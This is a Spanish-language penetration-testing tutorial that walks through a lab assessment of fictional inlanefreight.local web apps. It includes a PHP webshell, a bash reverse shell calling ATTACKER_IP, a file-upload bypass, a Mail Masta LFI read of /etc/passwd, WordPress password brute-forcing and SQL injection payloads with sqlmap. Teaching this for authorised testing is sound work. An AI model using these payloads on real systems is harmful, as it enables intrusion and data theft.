
# Enumeración y explotación web

Como se mencionó en la sección anterior, las aplicaciones web son donde solemos invertir la mayor parte del tiempo durante una Prueba de Penetración Externa (PPE). Suelen presentar una amplia superficie de ataque y pueden sufrir diversos tipos de vulnerabilidades que pueden provocar la ejecución remota de código o la exposición de datos confidenciales, por lo que debemos ser minuciosos con ellas.&#x20;

Es importante recordar que existe una diferencia entre un `Web Application Security Assessment (WASA)` y un `External Penetration Test`. En un Web Application Security Assessment (WASA), normalmente nos encargamos de encontrar e informar todas las vulnerabilidades, sin importar su gravedad (por ejemplo, una versión del servidor web en los encabezados de respuesta HTTP, una cookie que no tenga el indicador Secure o HttpOnly, etc.). No queremos empantanarnos con este tipo de hallazgos durante una PPE, ya que normalmente tenemos mucho terreno por cubrir.&#x20;

El documento de Scope of Work (SoW) debe diferenciar claramente entre los dos tipos de evaluación. Debe indicar explícitamente que durante una PPE se realizarán pruebas de aplicaciones web para buscar vulnerabilidades de alto riesgo. Si no tenemos muchos hallazgos, podemos analizar las aplicaciones web con mayor profundidad e incluir un hallazgo general `Best Practice Recommendation` que enumere varios problemas comunes de seguridad relacionados con los encabezados de respuesta HTTP que observamos con frecuencia, entre otros problemas menores. De esta forma, cumplimos con el contrato al abordar los problemas más importantes, como la inyección SQL, la carga de archivos sin restricciones, XSS, XXE, ataques Local File Inclusion, inyecciones de comandos, etc., pero nos cubrimos con el hallazgo informativo en caso de que el cliente vuelva a preguntar por qué no informamos de X.

***

## <mark style="color:purple;">Enumeración de aplicaciones web</mark>

La forma más rápida y eficiente de revisar varias aplicaciones web es usar una herramienta como [EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness) para tomar capturas de pantalla de cada aplicación, como se explica en la sección ["Descubrimiento y enumeración de aplicaciones"](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/descubrimiento-y-enumeracion-de-aplicaciones.md) . Esto es particularmente útil si tenemos un alcance masivo para nuestra evaluación y no es posible explorar cada aplicación web de una en una. En nuestro caso, tenemos `11` subdominios/vhosts (por ahora), así que vale la pena iniciar EyeWitness para que nos ayude, ya que queremos ser lo más eficientes posible para brindar al cliente la mejor evaluación posible. Esto significa acelerar cualquier tarea que se pueda realizar `rápido` y hacerlo de manera más eficiente `sin posibilidad de perderse cosas`. La automatización es excelente, pero si nos perdemos la mitad de lo que buscamos, entonces la automatización está haciendo más daño que bien. Asegúrate de comprender lo que hacen tus herramientas y verifica las cosas periódicamente para garantizar que tus herramientas y cualquier script personalizado funcionen como se espera.

```shell-session
afsh4ck@kali$ cat ilfreight_subdomains

inlanefreight.local 
blog.inlanefreight.local 
careers.inlanefreight.local 
dev.inlanefreight.local 
gitlab.inlanefreight.local 
ir.inlanefreight.local 
status.inlanefreight.local 
support.inlanefreight.local 
tracking.inlanefreight.local 
vpn.inlanefreight.local
monitoring.inlanefreight.local
```

Podemos enviar a EyeWitness un archivo .xml de Nmap o un escaneo de Nessus, lo cual resulta útil cuando tenemos un scope grande con muchos puertos abiertos, como suele ocurrir durante una prueba de penetración interna. En nuestro caso, simplemente usaremos la flag `-f` para proporcionarle la lista de subdominios en un archivo de texto que enumeramos anteriormente.

```shell-session
afsh4ck@kali$ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

################################################################################
#                                  EyeWitness                                  #
################################################################################
#           FortyNorth Security - https://www.fortynorthsecurity.com           #
################################################################################

Starting Web Requests (11 Hosts)
Attempting to screenshot http://inlanefreight.local
Attempting to screenshot http://blog.inlanefreight.local
Attempting to screenshot http://careers.inlanefreight.local
Attempting to screenshot http://dev.inlanefreight.local
Attempting to screenshot http://gitlab.inlanefreight.local
Attempting to screenshot http://ir.inlanefreight.local
Attempting to screenshot http://status.inlanefreight.local
Attempting to screenshot http://support.inlanefreight.local
Attempting to screenshot http://tracking.inlanefreight.local
Attempting to screenshot http://vpn.inlanefreight.local
Attempting to screenshot http://monitoring.inlanefreight.local
Finished in 34.79010033607483 seconds

[*] Done! Report written in the /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness folder!
Would you like to open the report now? [Y/n]
```

<figure><img src="/files/t8bYWcHiHqvBYBa2XKpj" alt=""><figcaption></figcaption></figure>

Los resultados de EyeWitness nos muestran varios hosts muy interesantes, cualquiera de los cuales podría aprovecharse para consolidarse en la red interna. Analicémoslos uno por uno.

***

### blog.inlanefreight.local

A primera vista, parece prometedor. El sitio parece ser una instalación olvidada de Drupal o quizás un sitio de prueba que se configuró y nunca se hizo un hardening. Podemos consultar el módulo [`Drupal - Enumeración`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/ataques-a-cms/drupal-enumeracion.md) para obtener ideas.

<figure><img src="/files/BZqNbLsoLhCFtSI5CAy1" alt=""><figcaption></figcaption></figure>

Usando `curl`, podemos ver que Drupal 9 está en uso.

```shell-session
afsh4ck@kali$ curl -s http://blog.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
      <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
```

Una búsqueda rápida en Google nos muestra que la versión estable actual de Drupal, prevista para producción, es [la 9.4](https://www.drupal.org/project/drupal/releases) , así que probablemente tendremos que tener suerte y encontrar algún error de configuración, como una contraseña de administrador débil para abusar de la funcionalidad integrada o un plugin vulnerable. Vulnerabilidades conocidas como `Drupalgeddon 1-3` no afectan a la versión 9.x de Drupal, así que es un callejón sin salida. Intentar iniciar sesión con algunas combinaciones de contraseña débiles, como `admin:admin`, `admin:Welcome1`, etc., no da resultado. Intentar registrar un usuario también falla, así que pasamos a la siguiente aplicación.

En nuestro informe pudimos observar que esta instancia de Drupal parece no estar en uso y podría valer la pena eliminarla para reducir aún más la superficie de ataque externa general.

***

### careers.inlanefreight.local

<figure><img src="/files/mcEycU3wSTyhiodNr9gR" alt=""><figcaption></figcaption></figure>

A continuación, el subdominio de carreras profesionales. Este tipo de sitios web suelen permitir al usuario registrar una cuenta, subir un CV y, potencialmente, una foto de perfil. Esta podría ser una vía de ataque interesante. Al acceder primero a la página de inicio de sesión `http://careers.inlanefreight.local/login`, podemos probar algunas evasiones de autenticación comunes y fuzzear el formulario de inicio de sesión para intentar eludir la autenticación o provocar algún tipo de mensaje de error o retraso que indique una inyección SQL. Como siempre, probamos algunas combinaciones de contraseñas débiles, como `admin:admin`. También deberíamos comprobar la enumeración de nombres de usuario en los formularios de inicio de sesión (y en los formularios de olvido de contraseña, si existen), pero no se observa ninguna en este caso.

La página `http://careers.inlanefreight.local/apply` nos permite solicitar un empleo y subir un CV. Al probar esta funcionalidad, se observa que permite subir cualquier tipo de archivo, pero la respuesta HTTP no muestra la ubicación del archivo una vez subido. La fuerza bruta de directorios no devuelve ningún directorio interesante, como  `/files` o `/uploads`, que pueda albergar una webshell si logramos subir un archivo malicioso.

Siempre es recomendable probar la funcionalidad de registro de usuarios en cualquier aplicación web que encontremos, ya que puede causar diversos problemas. En HTB Box [Academy](https://0xdf.gitlab.io/2021/02/27/htb-academy.html) , es posible registrarse en una aplicación web y modificar nuestro rol al de administrador al momento de registrarse. Esto se inspiró en un hallazgo real de una prueba de penetración externa, donde logré registrar hasta cinco roles de usuario diferentes en una aplicación web conectada a internet. Al iniciar sesión en la aplicación, se detectaron diversas vulnerabilidades de IDOR, lo que provocó errores de autorización en muchas páginas.

Vamos a seguir adelante y registrar una cuenta en `http://careers.inlanefreight.local/register`y mirar alrededor. Registramos una cuenta con detalles falsos: `test@test.com`y las credenciales `pentester:Str0ngP@ssw0rd!`.&#x20;

A veces necesitaremos usar una dirección de correo electrónico real para recibir un enlace de activación. Podemos usar un servicio de correo electrónico desechable como [10 Minute Mail](https://10minutemail.com/) para no saturar nuestra bandeja de entrada o mantener una cuenta ficticia con el correo ProtonMail o similar solo para fines de prueba. Estarás contento de no haber usado tu dirección de correo electrónico real la primera vez que Burp Suite Active Scanner llega a un formulario y te envía más de 1000 correos electrónicos. Regístrate también con credenciales decentemente fuertes. No quieres introducir un problema de seguridad en la aplicación web que tienes la tarea de probar al registrarte con credenciales como `test:test` que podrían potencialmente permanecer en la aplicación mucho después de que la prueba haya terminado (aunque deberíamos, por supuesto, enumerar en un apéndice de nuestro informe cualquier modificación realizada durante la prueba, incluso el registro en un sitio web público).

Una vez registrados, podemos iniciar sesión y explorarlo.&#x20;

<figure><img src="/files/IHqop5hZQjXRLTh2jc4Y" alt=""><figcaption></figcaption></figure>

Nos aparece nuestra página de perfil en `http://careers.inlanefreight.local/profile?id=9`. Intentar fuzzear el parámetro `id` para SQLi, inyección de comandos, inclusión de archivos, XSS, etc., no da resultado. El número de identificación en sí es interesante. Ajustarlo nos permite acceder a los perfiles de otros usuarios y ver a qué puestos se han postulado. Este es un ejemplo clásico de la vulnerabilidad `Insecure Direct Object Reference (IDOR)` y sin duda merecería la pena reportarlo debido a la posible exposición de datos confidenciales.

Tras agotar todas las opciones, nos quedamos con una vulnerabilidad reportable que añadimos a nuestra lista de hallazgos y pasamos a la siguiente aplicación web. Podemos usar cualquier herramienta de fuerza bruta de directorios, pero optaremos por [Gobuster](https://github.com/OJ/gobuster) .

#### Explotación

[#pregunta-1](#pregunta-1 "mention")

***

### dev.inlanefreight.local

<figure><img src="/files/GxOiBweqOooS0yBLrW7N" alt=""><figcaption></figcaption></figure>

La aplicación web `http://dev.inlanefreight.local` es sencilla pero llamativa. Cualquier elemento que contenga `dev` en la URL o el nombre es interesante, ya que podría exponerse accidentalmente y estar plagado de fallos o no estar listo para producción. La aplicación presenta un formulario de inicio de sesión simple titulado `Key Vault`. Parece un gestor de contraseñas casero o similar y podría exponer considerablemente los datos si logramos acceder. Las combinaciones de contraseñas débiles y las cargas útiles para eludir la autenticación no nos llevan a ninguna parte, así que volvamos a lo básico y busquemos otras páginas y directorios. Probemos primero con la lista de palabras `common.txt` usando extensiones de archivo `.php` para la primera ejecución.

```shell-session
$ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
```

<figure><img src="/files/igI6kl6NhN8fX7XZdhyE" alt=""><figcaption></figcaption></figure>

Recibimos algunos resultados interesantes, como un directorio de uploads.

Haciendo fuzzing con dirsearch además encontramos una flag, por lo que siempre es conveniente al hacer fuzzing contrastar con distintas herramientas:

```bash
dirsearch -u http://dev.inlanefreight.local -x 404,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/http_dev.inlanefreight.local/_25-05-12_22-37-49.txt

Target: http://dev.inlanefreight.local/

[22:37:49] Starting: 
[22:37:49] 301 -  331B  - /js  ->  http://dev.inlanefreight.local/js/
[22:38:01] 301 -  332B  - /css  ->  http://dev.inlanefreight.local/css/
[22:38:05] 200 -   38B  - /flag.txt
<---SNIP--->
```

Los archivos con un código de error `403 forbidden` suelen significar que existen, pero el servidor web no nos permite acceder a ellos de forma anónima. Las páginas `uploads` y `upload.php` llaman nuestra atención de inmediato. Si podemos cargar un webshell PHP, es probable que podamos acceder directamente a él en el directorio `/uploads`, que tiene habilitado el listado de directorios. Podemos registrar esto como un hallazgo válido `Directory Listing Enabled` de bajo riesgo y recopilar la evidencia necesaria para que la redacción del informe sea rápida y sencilla. Al acceder a `/upload.php` nos muestra un mensaje de error `403 Forbidden` y nada más, lo cual es interesante porque el código de estado es un código de éxito `200 OK`. Profundicemos en esto.

Necesitaremos Burp Suite para capturar la solicitud y ver si podemos averiguar qué sucede. Si capturamos la solicitud, la enviamos a Burp Repeater y luego volvemos a solicitar la página usando el método `OPTIONS`, vemos que se permiten varios métodos: `GET,POST,PUT,TRACK,OPTIONS`. Al recorrer las distintas opciones, cada una genera un error de servidor hasta que probamos el método `TRACK` y comprobamos que el encabezado `X-Custom-IP-Authorization:` está configurado en la respuesta HTTP. Podemos consultar la sección [`HTTP Verb Tampering`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-web-modernos/http-verb-tampering.md) para repasar este tipo de ataque.

<figure><img src="/files/qFrnRJjuPDXNFf58GwU7" alt=""><figcaption></figcaption></figure>

Experimentando un poco con la solicitud, añadiendo el encabezado `X-Custom-IP-Authorization: 127.0.0.1` a la solicitud HTTP en Burp Repeater y luego solicitando la página con el método `TRACK` de nuevo, se obtiene un resultado interesante. Vemos lo que parece ser un formulario de carga de archivos en el cuerpo de la respuesta HTTP.

<figure><img src="/files/MpvWt1qwNAeSvKD9mujS" alt=""><figcaption></figcaption></figure>

Si hacemos clic derecho en cualquier parte de la ventana `Response`, `Repeater` podemos seleccionar `show response in browser` copiar la URL resultante y solicitarla en el navegador que usemos con el proxy Burp. Se carga una plataforma de edición de fotos.

<figure><img src="/files/PBrRppuNyRlcEzCd4egz" alt=""><figcaption></figcaption></figure>

Podemos hacer clic en el botón `Browse` e intentar cargar un webshell simple con el siguiente contenido:

```php
<?php system($_GET['cmd']); ?>
```

También si el webshell funciona podríamos cargar un reverse shell en php para ganar una shell interactiva en el objetivo:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>
```

Podemos nombrar el archivo como `5351bf7271abaa2267e03c9ef6393f13.php` o algo similar. Es recomendable crear nombres de archivo aleatorios al subir un shell web a un sitio web público para que un atacante no lo encuentre. En nuestro caso, usaríamos un nombre protegido por contraseña o restringido a nuestra dirección IP, ya que el listado de directorios está habilitado y cualquiera podría acceder al directorio `/uploads`.&#x20;

<figure><img src="/files/MRqHuA4GqLdjDTSl2OZE" alt=""><figcaption></figcaption></figure>

Intentar subir el archivo  `.php` directamente genera un error: " `JPG, JPEG, PNG & GIF files are allowed.`", lo que indica que probablemente se esté implementando una validación débil del lado del cliente. Podemos obtener la solicitud POST, enviarla de nuevo a Repeater e intentar modificar el encabezado `Content-Type:` de la solicitud para ver si podemos engañar a la aplicación para que acepte nuestro archivo como válido. Intentaremos modificar el encabezado para `Content-Type: image/png` que haga pasar nuestro webshell como un archivo de imagen PNG válido. ¡Funciona!

<figure><img src="/files/IKJjDcfa3eGAWlHTQ8az" alt=""><figcaption></figcaption></figure>

Obtenemos la siguiente respuesta: `File uploaded /uploads/shell.php`.

Ahora podemos usar `curl` para interactuar con este webshell y ejecutar comandos en el servidor web.

```shell-session
afsh4ck@kali$ curl http://dev.inlanefreight.local/uploads/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Al verificar la dirección IP del host, no parece que hayamos accedido a la red interna de Inlanefreight, ya que la dirección IP no está dentro del scope de la red interna. Podría tratarse de un servidor web independiente, así que continuaremos.

```shell-session
afsh4ck@kali$ curl http://dev.inlanefreight.local/uploads/shell.php?cmd=hostname%20-I

172.18.0.3
```

Desde aquí, podemos enumerar más el host, buscar datos confidenciales, anotar otros dos hallazgos: `HTTP Verb Tampering`  y `Unrestricted File Upload`, y pasar al siguiente host.

#### Explotación

[#pregunta-2](#pregunta-2 "mention")

***

### ir.inlanefreight.local

<figure><img src="/files/Ylj0gPkQ8bGk5IlML6Yy" alt=""><figcaption></figcaption></figure>

El siguiente objetivo de nuestra lista es `http://ir.inlanefreight.local`el portal de relaciones con inversores de la empresa, alojado en WordPress. Para enumerarlo y atacarlo, podemos consultar la sección [`Wordpress - Ataques`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/ataques-a-cms/wordpress-ataques.md). Iniciemos el módulo `WPScan` y veamos qué podemos enumerar usando la opción `-ap` para enumerar todos los plugins.

```shell-session
afsh4ck@kali$ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] WordPress version 6.0 identified (Latest, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://ir.inlanefreight.local/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://ir.inlanefreight.local/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: cbusiness-investment
 | Location: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/
 | Latest Version: 0.7 (up to date)
 | Last Updated: 2022-04-25T00:00:00.000Z
 | Readme: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/readme.txt
 | Style URL: http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0
 | Style Name: CBusiness Investment
 | Style URI: https://www.themescave.com/themes/wordpress-theme-finance-free-cbusiness-investment/
 | Description: CBusiness Investment WordPress theme is used for all type of corporate business. That Multipurpose T...
 | Author: Themescave
 | Author URI: http://www.themescave.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/themes/cbusiness-investment/style.css?ver=6.0, Match: 'Version: 0.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] b2i-investor-tools
 | Location: http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/
 | Latest Version: 1.0.5 (up to date)
 | Last Updated: 2022-06-17T15:21:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0.5 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/style.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/css/export.css?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/wb_script.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amcharts.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/serial.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/amstock.js?ver=1.0.5
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/js/export.js?ver=1.0.5
 | Confirmed By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/b2i-investor-tools/readme.txt

[+] mail-masta
 | Location: http://ir.inlanefreight.local/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://ir.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:07:09 2022
[+] Requests Done: 35
[+] Cached Requests: 7
[+] Data Sent: 9.187 KB
[+] Data Received: 164.854 KB
[+] Memory used: 224.816 M
```

Del escaneo podemos deducir los siguientes datos:

* La versión principal de WordPress es la más reciente (6.0 al momento de escribir este artículo).
* El tema en uso es`cbusiness-investment`
* El plugin `b2i-investor-tools` está instalado
* El plugin `mail-masta` está instalado

El plugin `Mail Masta` es antiguo y presenta varias vulnerabilidades conocidas. Podemos usar [este](https://www.exploit-db.com/exploits/50226) exploit para leer archivos en el sistema de archivos subyacente aprovechando una vulnerabilidad de Local File Inclusion (LFI).

```shell-session
afsh4ck@kali$ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Podemos añadir otro hallazgo a nuestra lista: `Local File Inclusion (LFI)`. A continuación, veamos si podemos enumerar usuarios de WordPress usando `WPScan`.

```shell-session
afsh4ck@kalii$ wpscan -e u -t 500 --url http://ir.inlanefreight.local

<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <===================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] ilfreightwp
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Sitemap (Aggressive Detection)
 |   - http://ir.inlanefreight.local/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 23:14:33 2022
[+] Requests Done: 28
[+] Cached Requests: 37
[+] Data Sent: 8.495 KB
[+] Data Received: 269.719 KB
[+] Memory used: 176.859 MB
[+] Elapsed time: 00:00:0
```

También podríamos usar CMSeek (un poco más visual):

```
python3 cmseek.py

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  WordPress XML-RPC Bruteforce Module  [+] 

Enter target site (https://example.tld): http://ir.inlanefreight.local
[i] Checking for WordPress
[*] WordPress Confirmed... validating xmlrpc interface
[*] Login form found.. Detecting Username For Bruteforce
[i] Starting Username Harvest
[i] Harvesting usernames from wp-json api
[*] Found user from wp-json : ilfreightwp
[i] Harvesting usernames from jetpack public api
[!] No results from jetpack api... maybe the site doesn't use jetpack
[i] Harvesting usernames from wordpress author Parameter
[*] Found user from source code: tom
[*] Found user from source code: john
[*] Found user from source code: james
[*] Found user from redirection: ilfreightwp
[*] 4 Usernames were enumerated


[i] Bruteforcing User: james
```

Encontramos varios usuarios:

* `ilfreightwp`
* `Tom`
* `James`
* `John`

Intentemos forzar la contraseña de una de las cuentas usando [esta lista](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt) de palabras de `SecLists`. Al usar `WPScan`de nuevo, obtenemos una coincidencia para la cuenta `ilfreightwp`.

```shell-session
afsh4ck@kali$ sudo wpscan --url http://ir.inlanefreight.local -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -U ilfreightwp

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - ilfreightwp / password1                                                                   
Trying ilfreightwp / slipknot Time: 00:00:10 <                  > (310 / 100310)  0.30%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: ilfreightwp, Password: password1
```

Desde aquí, podemos acceder `http://ir.inlanefreight.local/wp-login.php` e iniciar sesión con las credenciales `ilfreightwp:password1`. Una vez iniciada la sesión, se nos dirigirá a `http://ir.inlanefreight.local/wp-admin/` donde podemos editar el archivo `404.php` del tema inactivo `Twenty Twenty`y agregar un shell web PHP para ejecutar código remoto.&#x20;

Tras editar esta página y lograr la ejecución de código siguiendo los pasos de la sección "[Ataques a WordPress](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/ataques-a-aplicaciones-web/ataques-a-cms/wordpress-ataques.md)", podemos registrar otro hallazgo `Weak WordPress Admin Credentials` y recomendar a nuestro cliente que implemente varias medidas de refuerzo si planea dejar este sitio de WordPress expuesto externamente.

También añadimos el usuario `ilfreightwp` a nuestra tabla de `Compromised Users` y el host `ir.inlanefreight.local` a la tabla de `Exploited Hosts`, ambos en el `Appendix` de nuestro informe.

{% content-ref url="/pages/FymiiJ2sEA90VD3GTVkT" %}
[CPTS Report](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/documentacion-e-informes/cpts-report.md)
{% endcontent-ref %}

<figure><img src="/files/y5VLrKfurLqRzcrCwgRb" alt=""><figcaption></figcaption></figure>

#### Explotación

[#pregunta-3](#pregunta-3 "mention")

***

### status.inlanefreight.local

<figure><img src="/files/TTA7sS8266IkPhYX7p2m" alt=""><figcaption></figcaption></figure>

Este sitio parece otro olvidado que no debería estar expuesto a internet. Parece ser una especie de aplicación interna para buscar en los registros. Al escribir una comilla simple (`'`), se genera un mensaje de error de MySQL que indica la presencia de una vulnerabilidad de inyección SQL: `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1`.&#x20;

Podemos explotar esto manualmente con un payload como:

```sql
' union select null, database(), user(), @@version -- //
```

<figure><img src="/files/DsjdhhBkYUp4Sz9UVZ8q" alt=""><figcaption></figcaption></figure>

Este es un ejemplo de un [ataque UNION de inyección SQL](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-web/sql-injection.md) .

También podemos usar sqlmap para aprovechar esto. Primero, capturamos la solicitud POST con Burp, la guardamos en un archivo y marcamos el parámetro `searchitem` con un `*` para que sqlmap sepa dónde inyectar.

```http
POST / HTTP/1.1
Host: status.inlanefreight.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://status.inlanefreight.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://status.inlanefreight.local/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s4nm572fgeaheb3lj86ha43c3p
Connection: close

searchitem=*
```

A continuación, ejecutamos esto a través de sqlmap de la siguiente manera:

```shell-session
afsh4ck@kali$ sqlmap -r sqli.txt --dbms=mysql 

<SNIP>

[00:07:24] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=%' AND 6921=6921#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=%' AND GTID_SUBSET(CONCAT(0x716a787071,(SELECT (ELT(5964=5964,1))),0x716a7a7171),5964) AND 'lVzh%'='lVzh

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=%' AND (SELECT 1227 FROM (SELECT(SLEEP(5)))jrOp) AND 'ENPh%'='ENPh

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: searchitem=%' UNION ALL SELECT NULL,NULL,CONCAT(0x716a787071,0x78724f676c7967575469546e6b765775707470466457486b78436373696d57546b4f72704d47735a,0x716a7a7171),NULL#
---
[00:07:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.6
[00:07:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:07:38 /2022-06-21/
```

A continuación, podemos enumerar las bases de datos disponibles y ver que la base de datos `status` es particularmente interesante:

```shell-session
afsh4ck@kali$ sqlmap -r sqli.txt --dbms=mysql --dbs

<SNIP>

---
[00:09:24] [INFO] testing MySQL
[00:09:24] [INFO] confirming MySQL
[00:09:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 8.0.0
[00:09:24] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] status
[*] sys

[00:09:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/status.inlanefreight.local'

[*] ending @ 00:09:24 /2022-06-21/
